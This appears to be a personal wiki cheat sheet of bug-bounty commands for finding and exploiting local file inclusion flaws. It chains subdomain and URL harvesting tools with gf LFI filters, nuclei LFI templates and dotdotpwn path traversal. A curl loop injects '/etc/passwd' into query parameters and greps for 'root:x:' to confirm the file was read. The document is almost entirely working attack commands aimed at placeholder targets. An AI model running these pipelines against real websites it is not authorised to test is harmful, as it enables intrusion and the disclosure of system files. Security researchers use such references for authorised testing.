
[[Subfinder]] + [[Httpx]] + [[GAU (GetAllUrls)]] + [[Uro]] + [[GF]] + [[Tee]]

1. `subfinder -d example.com | httpx-toolkit | gau | uro | gf lfi | tee gf_lfi.out`

[[Nuclei]]

2. `nuclei -list subdomains.txt -tags lfi`

3. `nuclei -target 'https://example.com/index.php?page=about.php' -tags lfi`

[[Echo]] + [[GAU (GetAllUrls)]] + [[Uro]] + [[GF]]

4. `echo 'https://example.com/' | gau | uro | gf lfi`

[[DotDotPwn]]

5. `dotdotpwn -m http-url -d 10 -f /etc/passwd -u "https://example.com/index.php/ajax.php?page=TRAVERSAL" -b -k "root:"`

[[Subfinder]] + [[Httpx]] + [[GAU (GetAllUrls)]] + [[Uro]] + [[GF]] + [[Qsreplace]] + [[Curl]] + [[Grep]]

6. `subfinder -d example.com | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is vulnerable"; done`

[[ParamSpider]]

7. `paramspider -d sub.domain.com --subs`
- `paramspider -l subdomains.txt --subs`

#### siehe auch:
- [[CORS Vulnerability like Lostsec]]
- [[Open Redirect like Lostsec]]
- [[Recon like Lostsec]]
- [[Microsoft IIS Server Vulnerability like Lostsec]]